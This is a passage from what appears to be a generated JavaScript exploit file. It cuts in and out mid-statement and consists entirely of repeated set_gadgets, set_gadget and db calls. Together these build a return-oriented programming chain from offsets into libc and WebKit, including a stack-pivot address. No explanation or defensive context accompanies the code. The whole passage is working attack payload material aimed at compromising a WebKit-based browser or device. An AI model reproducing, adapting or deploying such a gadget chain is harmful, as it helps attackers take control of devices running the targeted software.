]);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+87000,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+87016,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+87160,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+87128,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+87144,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+87232,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+87288,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+87368,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([1, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+87472,
webkit_base+7438103,
libc_base+793877,
ropchain+87488,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+87576,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+87632,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+87736,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+87840,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+87856,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+88000,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+87968,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+87984,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+88072,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+88128,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+88208,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+88312,
webkit_base+7438103,
libc_base+793877,
ropchain+88328,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+88416,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+88472,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+88544,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+88600,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

pivot_addr,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+88736,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+88840,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+88856,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+89000,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+88968,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+88984,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+89072,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+89128,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+89208,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([1, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+89312,
webkit_base+7438103,
libc_base+793877,
ropchain+89328,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+89416,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+89472,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+89544,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+89600,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+89688,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+89792,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+89808,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+89952,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+89920,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+89936,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+90024,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+90080,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+90160,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+90264,
webkit_base+7438103,
libc_base+793877,
ropchain+90280,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+90368,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+90424,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+90528,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+90632,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+90648,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+90792,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+90760,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+90776,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+90864,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+90920,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+91000,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([7, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+91104,
webkit_base+7438103,
libc_base+793877,
ropchain+91120,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+91208,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+91264,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+91336,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+91392,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+91480,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([40, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+91584,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+91600,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+91744,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+91712,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+91728,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+91824,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+91928,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+91944,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+92088,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+92056,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+92072,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+92160,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+92216,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+92296,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+92400,
webkit_base+7438103,
libc_base+793877,
ropchain+92416,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+92504,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+92560,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+92632,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+92688,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+788575,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+92824,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+92928,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+92944,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+93088,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+93056,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+93072,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+93160,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+93216,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+93296,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([9, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+93400,
webkit_base+7438103,
libc_base+793877,
ropchain+93416,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+93504,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+93560,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+93632,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+93688,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+93776,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+93880,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+93896,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+94040,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+94008,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+94024,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+94112,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+94168,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+94248,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([6, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+94352,
webkit_base+7438103,
libc_base+793877,
ropchain+94368,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+94456,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+94512,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+94616,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+94720,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+94736,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+94880,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+94848,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+94864,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+94952,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+95008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+95088,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([10, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+95192,
webkit_base+7438103,
libc_base+793877,
ropchain+95208,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+95296,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+95352,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+95424,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+95480,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

webkit_base+14461559,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+95616,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+95720,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+95736,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+95880,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+95848,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+95864,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+95952,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+96008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+96088,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([11, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+96192,
webkit_base+7438103,
libc_base+793877,
ropchain+96208,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+96296,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+96352,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+96424,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+96480,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+272260,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+96616,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+96720,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+96736,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+96880,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+96848,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+96864,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+96952,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+97008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+97088,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([12, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+97192,
webkit_base+7438103,
libc_base+793877,
ropchain+97208,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+97296,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+97352,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+97424,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+97480,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+793877,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+97616,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+97720,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+97736,
